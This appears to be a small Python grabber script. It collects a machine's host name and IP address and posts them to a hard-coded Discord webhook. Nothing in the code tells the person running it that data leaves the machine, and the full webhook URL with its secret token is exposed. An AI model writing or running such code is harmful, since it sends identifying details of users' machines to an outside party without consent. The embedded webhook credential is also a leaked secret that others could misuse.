import socket
import discord_webhook
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
print("Host name: ", host_name)
print("IP Address: ", ip_address)

from discord_webhook import DiscordWebhook, DiscordEmbed
content = "Placeholder Message"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m", username="")
embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()
